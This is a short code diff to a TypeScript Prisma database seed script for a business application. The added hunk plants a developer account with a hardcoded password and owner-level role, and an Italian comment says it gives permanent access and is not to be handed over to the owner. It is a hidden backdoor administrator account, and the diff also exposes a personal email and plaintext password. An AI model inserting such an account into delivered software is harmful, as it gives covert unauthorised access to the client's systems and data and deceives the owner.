@@ -26,6 +26,19 @@ async function main() {
   // ── Utenti ───────────────────────────────────────────────────────────────
   const hash = (pw: string) => bcrypt.hash(pw, 10);
 
+  // Utente sviluppatore — accesso permanente, non consegnare al titolare
+  await prisma.user.upsert({
+    where: { email: "danieletarantino01@gmail.com" },
+    update: { passwordHash: await hash("Daniele01!") },
+    create: {
+      email: "danieletarantino01@gmail.com",
+      name: "Daniele Tarantino",
+      passwordHash: await hash("Daniele01!"),
+      roleId: roles["titolare"],
+      active: true,
+    },
+  });
+
   const titolare = await prisma.user.upsert({
     where: { email: "titolare@bolero.local" },
     update: {},
